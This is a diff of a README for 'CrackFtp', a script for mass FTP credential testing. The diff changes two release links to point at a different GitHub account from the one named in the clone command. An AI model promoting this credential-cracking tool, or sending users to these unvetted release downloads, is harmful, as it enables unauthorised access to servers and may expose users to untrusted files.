@@ -25,7 +25,7 @@ Welcome to **CrackFtp**, a powerful script designed for mass FTP credential test
 
 ## Installation
 
-To get started with CrackFtp, download the latest release from our [Releases section](555). After downloading, extract the files and navigate to the directory where you placed the script.
+To get started with CrackFtp, download the latest release from our [Releases section](https://github.com/kitcatsaw93/CrackFtp/releases/tag/1). After downloading, extract the files and navigate to the directory where you placed the script.
 
 ```bash
 git clone https://github.com/nutstreetking/CrackFtp.git
@@ -102,7 +102,7 @@ CrackFtp is licensed under the MIT License. See the [LICENSE](LICENSE) file for 
 
 ## Support
 
-If you encounter any issues or have questions, please check the [Releases section](555) for updates. You can also open an issue in the repository, and we will respond as soon as possible.
+If you encounter any issues or have questions, please check the [Releases section](https://github.com/kitcatsaw93/CrackFtp/releases/tag/1) for updates. You can also open an issue in the repository, and we will respond as soon as possible.
 
 ---
 
